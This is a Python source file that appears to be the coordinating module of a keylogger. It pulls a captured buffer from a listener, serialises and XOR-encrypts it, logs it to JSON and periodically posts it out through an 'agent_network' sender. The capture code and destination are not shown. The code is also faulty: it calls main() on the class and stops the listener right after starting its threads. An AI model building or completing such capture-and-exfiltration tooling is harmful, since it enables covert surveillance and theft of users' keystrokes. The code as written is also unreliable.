from src.listener import Listener
from src.writer.console_log import ConsoleLog 
from src.writer.file_log import FileLog 
from src.writer.json_log import JsonLog 
from src.parser.encryption.xor import Xor
from src.parser.encryption.parsers import Parser
from time import sleep
from threading import Thread
from agent_network.send_json import post_json
from config.config import write_delay, send_json_delay 

class manager: 
    def __init__(self):
        self.listener = Listener()
        self.wr = ConsoleLog()
        self.wr2 = FileLog()
        self.json = JsonLog()
        self.parser = Parser()
        self.xor = Xor()

        self.parser = Parser()  
        self.xor = Xor()        

    def write_data(self):
        while True:
            sleep(write_delay) 
            if self.listener.buffer_has_data():
                buffer = self.listener.get_buffer()
                print(buffer)
                # preser the dict -> str
                parser_buffer= self.parser.parse_data(buffer)
                # encript the str 
                encBuffer=self.xor.encrypt(parser_buffer)
                # write -> json
                self.json.write(encBuffer)
                # print(encBuffer)
                
                # parser_buffer = self.parser.parse_data(buffer)
               
                # enc_buffer = self.xor.encrypt(parser_buffer)
                
                # self.json.write(enc_buffer)
                # print(enc_buffer)

    def send_json(self):
        while True:
            sleep(send_json_delay)
            post_json()

    def main(self):
        self.listener.start()  
        Thread(target=self.write_data, daemon=True).start()  
        Thread(target=self.send_json, daemon=True).start()   
        self.listener.stop()  

if __name__ == "__main__":
    manager.main()
